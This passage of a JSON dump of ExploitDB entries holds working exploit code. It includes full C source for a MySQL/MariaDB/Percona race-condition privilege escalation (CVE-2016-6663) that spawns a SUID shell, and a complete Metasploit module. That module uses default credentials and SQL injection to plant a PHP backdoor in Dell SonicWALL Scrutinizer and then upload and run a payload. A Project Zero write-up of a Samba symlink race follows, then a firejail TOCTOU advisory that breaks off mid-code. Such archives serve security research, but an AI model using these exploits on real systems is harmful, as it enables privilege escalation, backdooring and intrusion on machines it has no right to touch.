                "code": "/*\r\n\r\nSource: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html // http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c\r\n\r\nMySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit\r\nmysql-privesc-race.c (ver. 1.0)\r\n\r\nCVE-2016-6663 / OCVE-2016-5616\r\n\r\nDiscovered/Coded by:\r\n\r\nDawid Golunski\r\ndawid[at]legalhackers.com\r\nhttps://legalhackers.com\r\n\r\nFollow https://twitter.com/dawid_golunski for updates on this advisory.\r\n\r\n\r\nCompile:\r\ngcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient\r\n\r\nNote:\r\n* On RedHat-based systems you might need to change /tmp to another public directory (e.g. /uploads)\r\n\r\n* For testing purposes only. Do no harm.  \r\n\r\nFull advisory URL:\r\nhttps://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html\r\n\r\nVideo PoC:\r\nhttps://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html\r\n\r\n*/\r\n\r\n\r\n#include <fcntl.h>\r\n#include <grp.h>\r\n#include <mysql.h>\r\n#include <pwd.h>\r\n#include <stdint.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <sys/inotify.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/wait.h>\r\n#include <time.h>\r\n#include <unistd.h>\r\n\r\n\r\n#define EXP_PATH          \"/tmp/mysql_privesc_exploit\"\r\n#define EXP_DIRN          \"mysql_privesc_exploit\"\r\n#define MYSQL_TAB_FILE    EXP_PATH \"/exploit_table.MYD\"\r\n#define MYSQL_TEMP_FILE   EXP_PATH \"/exploit_table.TMD\"\r\n\r\n#define SUID_SHELL   \t  EXP_PATH \"/mysql_suid_shell.MYD\"\r\n\r\n#define MAX_DELAY 1000    // can be used in the race to adjust the timing if necessary\r\n\r\nMYSQL *conn;\t\t  // DB handles\r\nMYSQL_RES *res;\r\nMYSQL_ROW row;\r\n\r\nunsigned long cnt;\r\n\r\n\r\nvoid intro() {\r\n\r\nprintf( \r\n        \"\\033[94m\\n\"\r\n        \"MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit\\n\"\r\n        \"mysql-privesc-race.c (ver. 1.0)\\n\\n\"\r\n        \"CVE-2016-6663 / OCVE-2016-5616\\n\\n\"\r\n        \"For testing purposes only. Do no harm.\\n\\n\"\r\n\t\"Discovered/Coded by:\\n\\n\"\r\n\t\"Dawid Golunski \\n\"\r\n\t\"http://legalhackers.com\"\r\n        \"\\033[0m\\n\\n\");\r\n\r\n}\r\n\r\nvoid usage(char *argv0) {\r\n    intro();\r\n    printf(\"Usage:\\n\\n%s user pass db_host database\\n\\n\", argv0);\r\n}\r\n\r\nvoid mysql_cmd(char *sql_cmd, int silent) {\r\n    \r\n    if (!silent) {\r\n\t    printf(\"%s \\n\", sql_cmd);\r\n    }\r\n    if (mysql_query(conn, sql_cmd)) {\r\n        fprintf(stderr, \"%s\\n\", mysql_error(conn));\r\n        exit(1);\r\n    }\r\n    res = mysql_store_result(conn);\r\n    if (res>0) mysql_free_result(res);\r\n\r\n}\r\n\r\n\r\nint main(int argc,char **argv)\r\n{\r\n\r\n    int randomnum = 0;\r\n    int io_notified = 0;\r\n    int myd_handle;\r\n    int wpid;\r\n    int is_shell_suid=0;\r\n    pid_t pid;\r\n    int status;\r\n    struct stat st;\r\n    /* io notify */\r\n    int fd;\r\n    int ret;\r\n    char buf[4096] __attribute__((aligned(8)));\r\n    int num_read;\r\n    struct inotify_event *event;\r\n    /* credentials */\r\n    char *user     = argv[1];\r\n    char *password = argv[2];\r\n    char *db_host  = argv[3];\r\n    char *database = argv[4];\r\n\r\n\r\n    // Disable buffering of stdout\r\n    setvbuf(stdout, NULL, _IONBF, 0);\r\n\r\n    // Get the params\r\n    if (argc!=5) {\r\n\tusage(argv[0]);\r\n\texit(1);\r\n    } \r\n    intro();\r\n    // Show initial privileges\r\n    printf(\"\\n[+] Starting the exploit as: \\n\");\r\n    system(\"id\");\r\n\r\n    // Connect to the database server with provided credentials\r\n    printf(\"\\n[+] Connecting to the database `%s` as %s@%s\\n\", database, user, db_host);\r\n    conn = mysql_init(NULL);\r\n    if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) {\r\n        fprintf(stderr, \"%s\\n\", mysql_error(conn));\r\n        exit(1);\r\n    }\r\n\r\n    // Prepare tmp dir\r\n    printf(\"\\n[+] Creating exploit temp directory %s\\n\", \"/tmp/\" EXP_DIRN);\r\n    umask(000);\r\n    system(\"rm -rf /tmp/\" EXP_DIRN \" && mkdir /tmp/\" EXP_DIRN);\r\n    system(\"chmod g+s /tmp/\" EXP_DIRN );\r\n\r\n    // Prepare exploit tables :)\r\n    printf(\"\\n[+] Creating mysql tables \\n\\n\");\r\n    mysql_cmd(\"DROP TABLE IF EXISTS exploit_table\", 0);\r\n    mysql_cmd(\"DROP TABLE IF EXISTS mysql_suid_shell\", 0);\r\n    mysql_cmd(\"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 0);\r\n    mysql_cmd(\"CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 0);\r\n\r\n    // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file\r\n    // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory\r\n    printf(\"\\n[+] Copying bash into the mysql_suid_shell table.\\n    After the exploitation the following file/table will be assigned SUID and executable bits : \\n\");\r\n    system(\"cp /bin/bash \" SUID_SHELL);\r\n    system(\"ls -l \" SUID_SHELL);\r\n\r\n    // Use inotify to get the timing right\r\n    fd = inotify_init();\r\n    if (fd < 0) {\r\n        printf(\"failed to inotify_init\\n\");\r\n        return -1;\r\n    }\r\n    ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);\r\n\r\n\r\n    /* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */\r\n\r\n    printf(\"\\n[+] Entering the race loop... Hang in there...\\n\");\r\n\r\n    while ( is_shell_suid != 1 ) {\r\n\r\n        cnt++;\r\n\tif ( (cnt % 100) == 0 ) {\r\n\t \tprintf(\"->\");\r\n\t \t//fflush(stdout);\t\r\n\t}\r\n\r\n        /* Create empty file , remove if already exists */\r\n        unlink(MYSQL_TEMP_FILE);\r\n        unlink(MYSQL_TAB_FILE);\r\n   \tmysql_cmd(\"DROP TABLE IF EXISTS exploit_table\", 1);\r\n\tmysql_cmd(\"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 1);\r\n\r\n\t/* random num if needed */\r\n        srand ( time(NULL) );\r\n        randomnum = ( rand() % MAX_DELAY );\r\n\r\n        // Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink\r\n        pid = fork();\r\n        if (pid < 0) {\r\n            fprintf(stderr, \"Fork failed :(\\n\");\r\n        }\r\n\r\n        /* Child process - executes REPAIR TABLE  SQL statement */\r\n        if (pid == 0) {\r\n            usleep(500);\r\n            unlink(MYSQL_TEMP_FILE);\r\n\t    mysql_cmd(\"REPAIR TABLE exploit_table EXTENDED\", 1);\r\n            // child stops here\r\n            exit(0);\r\n        }\r\n\r\n        /* Parent process - aims to replace the temp .tmd table with a symlink before chmod */\r\n        if (pid > 0 ) {\r\n            io_notified = 0;\r\n\r\n            while (1) {\r\n                int processed = 0;\r\n                ret = read(fd, buf, sizeof(buf));\r\n                if (ret < 0) {\r\n                    break;\r\n                }\r\n                while (processed < ret) {\r\n                    event = (struct inotify_event *)(buf + processed);\r\n                    if (event->mask & IN_CLOSE) {\r\n                        if (!strcmp(event->name, \"exploit_table.TMD\")) {\r\n                            //usleep(randomnum);\r\n\r\n\t\t\t    // Set the .MYD permissions to suid+exec before they get copied to the .TMD file \r\n\t\t\t    unlink(MYSQL_TAB_FILE);\r\n\t\t\t    myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777);\r\n\t\t\t    close(myd_handle);\r\n\t\t\t    chmod(MYSQL_TAB_FILE, 04777);\r\n\r\n\t\t\t    // Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec\r\n                            unlink(MYSQL_TEMP_FILE);\r\n                            symlink(SUID_SHELL, MYSQL_TEMP_FILE);\r\n                            io_notified=1;\r\n                        }\r\n                    }\r\n                    processed += sizeof(struct inotify_event);\r\n                }\r\n                if (io_notified) {\r\n                    break;\r\n                }\r\n            }\r\n\r\n\r\n            waitpid(pid, &status, 0);\r\n        }\r\n\r\n\t// Check if SUID bit was set at the end of this attempt\r\n        if ( lstat(SUID_SHELL, &st) == 0 ) {\r\n\t    if (st.st_mode & S_ISUID) {\r\n\t\tis_shell_suid = 1;\r\n\t    }\r\n        } \r\n\r\n    }\r\n\r\n    printf(\"\\n\\n[+] \\033[94mBingo! Race won (took %lu tries) !\\033[0m Check out the \\033[94mmysql SUID shell\\033[0m: \\n\\n\", cnt);\r\n    system(\"ls -l \" SUID_SHELL);\r\n\r\n    printf(\"\\n[+] Spawning the \\033[94mmysql SUID shell\\033[0m now... \\n    Remember that from there you can gain \\033[1;31mroot\\033[0m with vuln \\033[1;31mCVE-2016-6662\\033[0m or \\033[1;31mCVE-2016-6664\\033[0m :)\\n\\n\");\r\n    system(SUID_SHELL \" -p -i \");\r\n    //system(SUID_SHELL \" -p -c '/bin/bash -i -p'\");\r\n\r\n    /* close MySQL connection and exit */\r\n    printf(\"\\n[+] Job done. Exiting\\n\\n\");\r\n    mysql_close(conn);\r\n    return 0;\r\n\r\n}",
                "description": "MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysql' System User Privilege Escalation / Race Condition",
                "author": "Dawid Golunski",
                "_id": 40678,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2016-11-01T00:00:00+00:00",
                "cve": [
                    "CVE-2016-6663",
                    "CVE-2016-5616",
                    "CVE-2016-6662",
                    "CVE-2016-6664"
                ],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = ExcellentRanking\r\n\r\n  include Msf::Exploit::Remote::HttpClient\r\n  include Msf::Exploit::FileDropper\r\n  include Msf::Exploit::EXE\r\n\r\n  WINDOWS = /^win/i\r\n  LINUX   = /linux/i\r\n\r\n  def initialize(info={})\r\n    super(update_info(info,\r\n      'Name'           => \"Dell SonicWALL Scrutinizer 11.01 methodDetail SQL Injection\",\r\n      'Description'    => %q{\r\n        This module exploits a vulnerability found in Dell SonicWALL Scrutinizer. The methodDetail\r\n        parameter in exporters.php allows an attacker to write arbitrary files to the file system\r\n        with an SQL Injection attack, and gain remote code execution under the context of SYSTEM\r\n        for Windows, or as Apache for Linux.\r\n\r\n        Authentication is required to exploit this vulnerability, but this module uses\r\n        the default admin:admin credential.\r\n      },\r\n      'License'        => MSF_LICENSE,\r\n      'Author'         =>\r\n        [\r\n          'bperry', # Original discovery, PoC, and Metasploit module\r\n          'sinn3r'  # Metasploit module for native support\r\n        ],\r\n      'References'     =>\r\n        [\r\n          [ 'CVE', '2014-4977' ],\r\n          [ 'BID', '68495' ],\r\n          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Jul/44' ],\r\n          [ 'URL','https://gist.github.com/brandonprry/76741d9a0d4f518fe297' ]\r\n        ],\r\n      'Arch'           => [ ARCH_X86 ],\r\n      'Platform'       => [ 'win', 'linux' ],\r\n      'Targets'        =>\r\n        [\r\n          [ 'Automatic', {} ],\r\n          [\r\n            'Dell SonicWALL Scrutinizer 11.01 on Windows',\r\n            {\r\n              'Arch'     => ARCH_X86,\r\n              'Platform' => 'win',\r\n            }\r\n          ],\r\n          [\r\n            'Dell SonicWALL Scrutinizer 11.01 Linux Appliance',\r\n            {\r\n              'Arch'     => ARCH_X86,\r\n              'Platform' => 'linux'\r\n            }\r\n          ]\r\n        ],\r\n      'Privileged'     => false,\r\n      'DisclosureDate' => 'Jul 24 2014',\r\n      'DefaultTarget'  => 0))\r\n\r\n    register_options(\r\n      [\r\n        OptString.new('TARGETURI', [ true, \"Base Application path\", \"/\" ]),\r\n        OptString.new('USERNAME', [ true,  'The username to authenticate as', 'admin' ]),\r\n        OptString.new('PASSWORD', [ true,  'The password to authenticate with', 'admin' ])\r\n      ], self.class)\r\n  end\r\n\r\n\r\n  # Prints a message with the target's IP and port.\r\n  #\r\n  # @param msg [String] Message to print.\r\n  # @return [void]\r\n  def print_status(msg='')\r\n    super(\"#{peer} - #{msg}\")\r\n  end\r\n\r\n\r\n  # Prints an error message with the target's IP and port.\r\n  #\r\n  # @param msg [String] Message to print.\r\n  # @return [void]\r\n  def print_error(msg='')\r\n    super(\"#{peer} - #{msg}\")\r\n  end\r\n\r\n\r\n  # Pads NULL columns for a SQL injection string.\r\n  #\r\n  # @param n [Fixnum] Number of nulls\r\n  # @return [String]\r\n  def pad_null(n)\r\n    padding = []\r\n\r\n    n.times do\r\n      padding << 'NULL'\r\n    end\r\n\r\n    padding * ','\r\n  end\r\n\r\n\r\n  # Checks (explicitly) the target for the vulnerability. To be able to check this, a\r\n  # valid username/password is required.\r\n  #\r\n  # @return [void]\r\n  def check\r\n    begin\r\n      res = do_login\r\n    rescue Msf::Exploit::Failed => e\r\n      vprint_error(e.message)\r\n      return Exploit::CheckCode::Unknown\r\n    end\r\n\r\n    uid = res['userid']\r\n    sid = res['sessionid']\r\n    pattern = Rex::Text.rand_text_alpha(10)\r\n    sqli_str = \"-6045 UNION ALL SELECT '#{pattern}',#{pad_null(19)}\"\r\n    res = do_sqli(sqli_str, sid, uid).get_json_document\r\n    return Exploit::CheckCode::Vulnerable if res['id'].to_s == pattern\r\n\r\n    Exploit::CheckCode::Safe\r\n  end\r\n\r\n\r\n  # Returns the OS information by using @@version_compile_os.\r\n  #\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [String] The OS information.\r\n  def get_os(sid, uid)\r\n    sqli_str = \"-6045 UNION ALL SELECT @@version_compile_os,#{pad_null(19)}\"\r\n    res = do_sqli(sqli_str, sid, uid).get_json_document\r\n    res['id']\r\n  end\r\n\r\n\r\n  # Returns target's d4d directory path that will be used to upload our malicious files.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @return [String]\r\n  def get_d4d_path(os)\r\n    case os\r\n    when WINDOWS\r\n      # On Windows, the full d4d path looks something like this:\r\n      # C:\\Program Files\\Scrutinizer\\html\\d4d\r\n      '../../html/d4d'\r\n    when LINUX\r\n      # On the Linux appliance, the d4d path looks exactly like this:\r\n      '/home/plixer/scrutinizer/html/d4d'\r\n    end\r\n  end\r\n\r\n\r\n  # Logs into Dell SonicWALL Scrutinizer.\r\n  #\r\n  # @return [Hash] JSON response.\r\n  def do_login\r\n    res = send_request_cgi({\r\n      'uri' => normalize_uri(target_uri, '/cgi-bin/login.cgi'),\r\n      'vars_get' => {\r\n        'name' => datastore['USERNAME'],\r\n        'pwd' => datastore['PASSWORD']\r\n      }\r\n    })\r\n\r\n    unless res\r\n      fail_with(Failure::Unknown, 'The connection timed out while attempting to log in.')\r\n    end\r\n\r\n    res = res.get_json_document\r\n\r\n    if res['noldapnouser']\r\n      fail_with(Failure::NoAccess, \"Username '#{datastore['USERNAME']}' is incorrect.\")\r\n    elsif res['loginfailed']\r\n      fail_with(Failure::NoAccess, \"Password '#{datastore['PASSWORD']}' is incorrect.\")\r\n    end\r\n\r\n    report_cred(datastore['USERNAME'], datastore['PASSWORD'])\r\n\r\n    res\r\n  end\r\n\r\n\r\n  # Saves a valid username/password to database.\r\n  #\r\n  # @param username [String]\r\n  # @param password [String]\r\n  # @return [void]\r\n  def report_cred(username, password)\r\n    service_data = {\r\n      address: rhost,\r\n      port: rport,\r\n      service_name: ssl ? 'https' : 'http',\r\n      protocol: 'tcp',\r\n      workspace_id: myworkspace_id\r\n    }\r\n\r\n    credential_data = {\r\n      module_fullname: self.fullname,\r\n      origin_type: :service,\r\n      username: username,\r\n      private_data: password,\r\n      private_type: :password\r\n    }.merge(service_data)\r\n\r\n    credential_core = create_credential(credential_data)\r\n\r\n    login_data = {\r\n      core: credential_core,\r\n      last_attempted_at: DateTime.now,\r\n      status: Metasploit::Model::Login::Status::SUCCESSFUL\r\n    }.merge(service_data)\r\n\r\n    create_credential_login(login_data)\r\n  end\r\n\r\n\r\n  # Injects malicious SQL string to the methodDetail parameter against the target machine.\r\n  #\r\n  # @param method_detail [String] Malicious SQL injection string.\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [Rex::Proto::Http::Response]\r\n  def do_sqli(method_detail, sid, uid)\r\n    res = send_request_cgi({\r\n      'uri'      => normalize_uri(target_uri, '/d4d/exporters.php'),\r\n      'vars_get' => { 'methodDetail'=> method_detail },\r\n      'cookie'   => \"cookiesenabled=1;sessionid=#{sid};userid=#{uid}\"\r\n    })\r\n\r\n    unless res\r\n      fail_with(Failure::Unknown, 'The connection timed out for exporters.php.')\r\n    end\r\n\r\n    res\r\n  end\r\n\r\n\r\n  # Returns a PHP backdoor that is to be uploaded onto the target machine.\r\n  #\r\n  # @param os [String] Target OS information.\r\n  # @param target_path [String]\r\n  # @return [String] PHP backdoor\r\n  def get_php_backdoor(os)\r\n    case os\r\n    when WINDOWS\r\n      chmod_code = %Q|chmod($bname, 0777);|\r\n      exec_code = %Q|exec($bname);|\r\n    when LINUX\r\n      chmod_code = %Q|chmod(\"./\" . $bname, 0777);|\r\n      exec_code = %Q|exec(\"./\" . $bname);|\r\n    end\r\n\r\n    %Q|<?php\r\n    $bname = basename( $_FILES['uploadedfile']['name']);\r\n    $target_path = \"./\" . $bname;\r\n    move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);\r\n    #{chmod_code}\r\n    #{exec_code}\r\n    ?>\r\n    |.gsub(/\\x20{4}/, ' ')\r\n  end\r\n\r\n\r\n  # Uploads the executable payload via malicious PHP backdoor.\r\n  #\r\n  # @param backdoor_fname [String] Name of the backdoor\r\n  # @param payload_fname [String] Name of the executable payload\r\n  # @return [void]\r\n  def upload_payload(backdoor_fname, payload_fname)\r\n    p = generate_payload_exe(\r\n      code: payload.encoded,\r\n      platform: @my_target.platform,\r\n      arch: @my_target.arch\r\n    )\r\n\r\n    print_status(\"Uploading #{payload_fname} (#{p.length} bytes)...\")\r\n\r\n    post_data = Rex::MIME::Message.new\r\n    post_data.add_part(\r\n      p,\r\n      'application/octet-stream',\r\n      'binary',\r\n      \"form-data; name=\\\"uploadedfile\\\"; filename=\\\"#{payload_fname}\\\"\"\r\n    )\r\n    data = post_data.to_s\r\n\r\n    res = send_request_cgi({\r\n      'method' => 'POST',\r\n      'uri'    => normalize_uri(target_uri, \"/d4d/#{backdoor_fname}\"),\r\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\r\n      'data'   => data\r\n    })\r\n\r\n    unless res\r\n      # Here we are not using fail_with, because when we get a session, it seems to be creating\r\n      # the same effect as connection hanging... and then eventually times out. If that\r\n      # happens, a fail_with() can cause msfconsole to believe there is no session created.\r\n      vprint_status('Connection timed out while uploading payload.')\r\n      return\r\n    end\r\n\r\n    if res.code == 404\r\n      fail_with(Failure::Unknown, \"Server returned 404 for #{backdoor_fname}.\")\r\n    end\r\n  end\r\n\r\n\r\n  # Uploads the PHP backdoor onto the target machine. The reason of using a PHP backdoor to upload\r\n  # is because our SQL injection is in a GET method, and Apache has a max length of 8190 bytes,\r\n  # which is bad for some built-in or custom payloads.\r\n  #\r\n  # @param opts [Hash]\r\n  # @option opts [String] :d4d_path\r\n  # @option opts [String] :backdoor_fname\r\n  # @option opts [String] :payload_fname\r\n  # @option opts [String] :sid\r\n  # @option opts [String] :uid\r\n  # @option opts [String] :os\r\n  # @return [void]\r\n  def upload_php_backdoor(opts)\r\n    d4d_path       = opts[:d4d_path]\r\n    backdoor_fname = opts[:backdoor_fname]\r\n    payload_fname  = opts[:payload_fname]\r\n    sid            = opts[:sid]\r\n    uid            = opts[:uid]\r\n    os             = opts[:os]\r\n\r\n    print_status(\"Injecting a PHP upload backdoor (#{backdoor_fname})...\")\r\n    hex_backdoor = get_php_backdoor(os).unpack(\"H*\")[0]\r\n    sqli_str = \"-6045 UNION ALL SELECT 0x#{hex_backdoor},#{pad_null(19)} INTO DUMPFILE '#{d4d_path}/#{backdoor_fname}' #\"\r\n    do_sqli(sqli_str, sid, uid)\r\n  end\r\n\r\n\r\n  # Attempts a SQL injection attack against the target machine.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [void]\r\n  def do_backdoor_sqli(os, sid, uid)\r\n    backdoor_fname = \"#{Rex::Text.rand_text_alpha(6)}.php\"\r\n    payload_fname  = Rex::Text.rand_text_alpha(5)\r\n    payload_fname << '.exe' if @my_target['Platform'].match(WINDOWS)\r\n    d4d_path       = get_d4d_path(os)\r\n\r\n    register_files_for_cleanup(backdoor_fname, payload_fname)\r\n\r\n    opts = {\r\n      d4d_path: d4d_path,\r\n      backdoor_fname: backdoor_fname,\r\n      payload_fname: payload_fname,\r\n      sid: sid,\r\n      uid: uid,\r\n      os: os\r\n    }\r\n\r\n    upload_php_backdoor(opts)\r\n    upload_payload(backdoor_fname, payload_fname)\r\n  end\r\n\r\n\r\n  # Tries to set the target. If the user manually set one, then avoid automatic target.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @return [void]\r\n  def try_set_target(os)\r\n    @my_target = target if target != targets[0]\r\n    case os\r\n    when WINDOWS\r\n      @my_target = targets[1]\r\n    when LINUX\r\n      @my_target = targets[2]\r\n    else\r\n      fail_with(Failure::NoTarget, 'Unsupported target')\r\n    end\r\n  end\r\n\r\n\r\n  # Exploits the target machine. To do this, first we must log into the system in order to obtain\r\n  # the user ID and session ID. After logging in, we can ask the vulnerable code to upload a\r\n  # malicious PHP backdoor, and then finally use that backdoor to upload and execute our payload.\r\n  def exploit\r\n    res = do_login\r\n    uid = res['userid']\r\n    sid = res['sessionid']\r\n    os = get_os(sid, uid)\r\n    print_status(\"Detected OS information: #{os}\")\r\n    try_set_target(os)\r\n    do_backdoor_sqli(os, sid, uid)\r\n  end\r\n\r\nend",
                "description": "Dell SonicWALL Scrutinizer 11.01 - methodDetail SQL Injection (Metasploit)",
                "author": "Metasploit",
                "_id": 39836,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2016-05-17T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1039\r\n\r\nThe Samba server is supposed to only grant access to configured share\r\ndirectories unless \"wide links\" are enabled, in which case the server is allowed\r\nto follow symlinks. The default (since CVE-2010-0926) is that wide links are\r\ndisabled.\r\n\r\nsmbd ensures that it isn't following symlinks by calling lstat() on every\r\npath component, as can be seen in strace (in reaction to the request\r\n\"get a/b/c/d/e/f/g/h/i/j\", where /public is the root directory of the share):\r\n\r\nroot@debian:/home/user# strace -e trace=file -p18954\r\nProcess 18954 attached\r\nlstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\ngetcwd(\"/public\", 4096)                 = 8\r\nlstat(\"/public/a\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h/i\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\nstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\ngetxattr(\"a/b/c/d/e/f/g/h/i/j\", \"system.posix_acl_access\", 0x7ffc8d870c30, 132) = -1 ENODATA (No data available)\r\nstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\nopen(\"a/b/c/d/e/f/g/h/i/j\", O_RDONLY)   = 35\r\n\r\n\r\nThis is racy: Any of the path components - either one of the directories or the\r\nfile at the end - could be replaced with a symlink by an attacker over a second\r\nconnection to the same share. For example, replacing a/b/c/d/e/f/g/h/i\r\nwith a symlink  to / immediately before the open() call would cause smbd to open\r\n/j.\r\n\r\nTo reproduce:\r\n\r\n - Set up a server with Samba 4.5.2. (I'm using Samba 4.5.2 from Debian\r\n   unstable. I'm running the attacks on a native machine while the server is\r\n   running in a VM on the same machine.)\r\n - On the server, create a world-readable file \"/secret\" that contains some\r\n   text. The goal of the attacker is to leak the contents of that file.\r\n - On the server, create a directory \"/public\", mode 0777.\r\n - Create a share named \"public\", accessible for guests, writable, with path\r\n   \"/public\".\r\n - As the attacker, patch a copy of the samba-4.5.2 sourcecode with the patch in\r\n   attack_commands.patch.\r\n - Build the patched copy of samba-4.5.2. The built smbclient will be used in\r\n   the following steps.\r\n - Prepare the server's directory layout remotely and start the rename side of\r\n   the race:\r\n\r\n   $ ./bin/default/source3/client/smbclient -N -U guest //192.168.56.101/public\r\n   ./bin/default/source3/client/smbclient: Can't load /usr/local/samba/etc/smb.conf - run testparm to debug it\r\n   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.2-Debian]\r\n   smb: \\> posix\r\n   Server supports CIFS extensions 1.0\r\n   Server supports CIFS capabilities locks acls pathnames posix_path_operations large_read posix_encrypt\r\n   smb: /> ls\r\n     .                                   D        0  Wed Dec 14 23:54:30 2016\r\n     ..                                  D        0  Wed Dec 14 13:02:50 2016\r\n\r\n        98853468 blocks of size 1024. 66181136 blocks available\r\n   smb: /> symlink / link\r\n   smb: /> mkdir normal\r\n   smb: /> put /tmp/empty normal/secret # empty file\r\n   putting file /tmp/empty as /normal/secret (0.0 kb/s) (average 0.0 kb/s)\r\n   smb: /> rename_loop link normal foobar\r\n\r\n - Over a second connection, launch the read side of the race:\r\n\r\n   $ ./bin/default/source3/client/smbclient -N -U guest //192.168.56.101/public\r\n   ./bin/default/source3/client/smbclient: Can't load /usr/local/samba/etc/smb.conf - run testparm to debug it\r\n   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.2-Debian]\r\n   smb: \\> posix\r\n   Server supports CIFS extensions 1.0\r\n   Server supports CIFS capabilities locks acls pathnames posix_path_operations large_read posix_encrypt\r\n   smb: /> dump foobar/secret\r\n\r\n - At this point, the race can theoretically be hit. However, because the\r\n   renaming client performs operations synchronously, the network latency makes\r\n   it hard to win the race. (It shouldn't be too hard to adapt the SMB client to\r\n   be asynchronous, which would make the attack much more practical.) To make it\r\n   easier to hit the race, log in to the server as root and run \"strace\" against\r\n   the process that is trying to access foobar/secret all the time without any\r\n   filtering (\"strace -p19624\"). On my machine, this causes the race to be hit\r\n   every few seconds, and the smbclient that is running the \"dump\" command\r\n   prints the contents of the file each time the race is won.\r\n\r\n\r\nProof of Concept:\r\nhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41740.zip",
                "description": "Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory",
                "author": "Google Security Research",
                "_id": 41740,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2017-03-27T00:00:00+00:00",
                "cve": [
                    "CVE-2010-0926"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "# firejail advisory for TOCTOU in --get and --put (local root)\r\n\r\nReleasing a brief advisory/writeup about a local root privesc found in firejail that we reported back in Nov, 2016. This is in response to a recent [thread](http://seclists.org/oss-sec/2017/q1/20) on oss-sec where people seem interested in details of firejail security issues. This particular vulnerability was fixed in commit [e152e2d](https://github.com/netblue30/firejail/commit/e152e2d067e17be33c7e82ce438c8ae740af6a66) but no CVE was assigned.\r\n\r\n## Vulnerability\r\n\r\nThis is a TOCTOU (race condition) bug when testing access permissions with access() and then calling copy_file(). At the time of discovery, it was clear the code suffered from many insecure coding constructs like this and much more -- but there was no guideline around making security related bug reports (other than using the public issue tracker).\r\n\r\n### Code: src/firejail/ls.c\r\n~~~~\r\nvoid sandboxfs(int op, pid_t pid, const char *path) {\r\n        EUID_ASSERT();\r\n\r\n        // if the pid is that of a firejail  process, use the pid of the first child process\r\n        EUID_ROOT();\r\n        char *comm = pid_proc_comm(pid);\r\n        EUID_USER();\r\n        if (comm) {\r\n                if (strcmp(comm, \"firejail\") == 0) {\r\n                        pid_t child;\r\n                        if (find_child(pid, &child) == 0) {\r\n                                pid = child;\r\n                        }\r\n                }\r\n                free(comm);\r\n        }\r\n\r\n        // check privileges for 